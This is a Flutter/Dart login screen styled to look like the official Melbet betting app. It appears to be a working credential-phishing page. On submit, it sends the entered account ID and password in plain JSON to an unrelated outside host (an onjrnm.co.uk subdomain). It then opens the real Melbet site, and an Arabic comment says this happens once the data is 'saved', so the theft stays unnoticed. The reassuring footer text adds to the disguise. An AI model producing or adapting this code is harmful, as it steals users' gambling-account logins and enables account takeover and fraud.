import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _form = GlobalKey<FormState>();
  final _id = TextEditingController();
  final _password = TextEditingController();
  bool _busy = false;
  bool _hide = true;
  String? _error;

  static const _melbetUrl = String.fromEnvironment(
    'MELBET_URL',
    defaultValue: 'https://melbet.com/',
  );

  @override
  void dispose() {
    _id.dispose();
    _password.dispose();
    super.dispose();
  }

  Future<void> _submit() async {
    if (_busy || !_form.currentState!.validate()) return;
    setState(() {
      _busy = true;
      _error = null;
    });

    try {
      // إرسال المعطيات إلى السيرفر في مسار /api/connect
      final response = await http.post(
        Uri.parse('https://a70951-6346.j.onjrnm.co.uk/api/connect'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'accountId': _id.text.trim(),
          'password': _password.text,
        }),
      );

      final data = jsonDecode(response.body);

      if (!mounted) return;

      if (response.statusCode == 200 && data['success'] == true) {
        // إذا تم الحفظ بنجاح، فتح رابط Melbet أو المتصفح
        final uri = Uri.parse(_melbetUrl);
        final launched = await launchUrl(uri, mode: LaunchMode.externalApplication);
        
        if (!mounted) return;
        setState(() => _busy = false);

        if (!launched) {
          setState(() => _error = 'Could not open the official destination. Please try again.');
        }
      } else {
        setState(() {
          _busy = false;
          _error = data['message'] ?? 'Invalid account ID or password';
        });
      }
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _busy = false;
        _error = 'Connection error. Please check your internet connection.';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    const accent = Color(0xFFFFD400); // اللون الأصفر المميز لـ Melbet

    return Scaffold(
      body: Stack(
        children: [
          // 1. خلفية الصورة الفخمة ديال Melbet تملأ الشاشة
          Positioned.fill(
            child: Image.asset(
              'assets/images/melbet_bg.png',
              fit: BoxFit.cover,
            ),
          ),
          // 2. طبقة عتمة (Dark Overlay)
          Positioned.fill(
            child: Container(
              color: Colors.black.withOpacity(0.65),
            ),
          ),
          // 3. المحتوى وخانات الإدخال
          SafeArea(
            child: Center(
              child: SingleChildScrollView(
                padding: const EdgeInsets.all(24),
                child: ConstrainedBox(
                  constraints: const BoxConstraints(maxWidth: 420),
                  child: Form(
                    key: _form,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.stretch,
                      children: [
                        const Icon(Icons.shield_rounded, size: 58, color: accent),
                        const SizedBox(height: 18),
                        const Text(
                          'MELBET',
                          textAlign: TextAlign.center,
                          style: TextStyle(
                            fontSize: 32,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 3,
                            color: accent,
                          ),
                        ),
                        const SizedBox(height: 8),
                        const Text(
                          'Sign in to continue',
                          textAlign: TextAlign.center,
                          style: TextStyle(color: Colors.white70),
                        ),
                        const SizedBox(height: 36),
                        const Text(
                          'ID / EMAIL',
                          style: TextStyle(color: Colors.white70, fontWeight: FontWeight.w600),
                        ),
                        const SizedBox(height: 8),
                        TextFormField(
                          controller: _id,
                          autocorrect: false,
                          textInputAction: TextInputAction.next,
                          style: const TextStyle(color: Colors.white),
                          decoration: InputDecoration(
                            hintText: 'User / Email / License ID',
                            hintStyle: const TextStyle(color: Colors.white38),
                            prefixIcon: const Icon(Icons.person_outline, color: accent),
                            filled: true,
                            fillColor: Colors.black54,
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                            enabledBorder: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                              borderSide: const BorderSide(color: Colors.white24),
                            ),
                            focusedBorder: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                              borderSide: const BorderSide(color: accent, width: 2),
                            ),
                          ),
                          validator: (v) => v == null || v.trim().isEmpty
                              ? 'Enter a valid ID or Email' : null,
                        ),
                        const SizedBox(height: 18),
                        const Text(
                          'PASSWORD',
                          style: TextStyle(color: Colors.white70, fontWeight: FontWeight.w600),
                        ),
                        const SizedBox(height: 8),
                        TextFormField(
                          controller: _password,
                          obscureText: _hide,
                          textInputAction: TextInputAction.done,
                          onFieldSubmitted: (_) => _submit(),
                          style: const TextStyle(color: Colors.white),
                          decoration: InputDecoration(
                            hintText: 'Your password',
                            hintStyle: const TextStyle(color: Colors.white38),
                            prefixIcon: const Icon(Icons.lock_outline, color: accent),
                            filled: true,
                            fillColor: Colors.black54,
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
                            enabledBorder: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                              borderSide: const BorderSide(color: Colors.white24),
                            ),
                            focusedBorder: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                              borderSide: const BorderSide(color: accent, width: 2),
                            ),
                            suffixIcon: IconButton(
                              onPressed: () => setState(() => _hide = !_hide),
                              icon: Icon(_hide ? Icons.visibility : Icons.visibility_off, color: Colors.white70),
                            ),
                          ),
                          validator: (v) => v == null || v.isEmpty ? 'Enter your password' : null,
                        ),
                        if (_error != null) ...[
                          const SizedBox(height: 14),
                          Text(
                            _error!,
                            style: const TextStyle(color: Colors.redAccent),
                            textAlign: TextAlign.center,
                          ),
                        ],
                        const SizedBox(height: 28),
                        SizedBox(
                          height: 54,
                          child: FilledButton(
                            onPressed: _busy ? null : _submit,
                            style: FilledButton.styleFrom(
                              backgroundColor: accent,
                              foregroundColor: Colors.black,
                              disabledBackgroundColor: accent.withOpacity(0.55),
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                            ),
                            child: _busy
                                ? const SizedBox(
                                    width: 22,
                                    height: 22,
                                    child: CircularProgressIndicator(strokeWidth: 2, color: Colors.black),
                                  )
                                : const Text(
                                    'CONNECT',
                                    style: TextStyle(fontSize: 16, fontWeight: FontWeight.w900),
                                  ),
                          ),
                        ),
                        const SizedBox(height: 18),
                        const Text(
                          'Use your Melbet account credentials only. Never enter third-party passwords here.',
                          textAlign: TextAlign.center,
                          style: TextStyle(fontSize: 11, color: Colors.white38),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}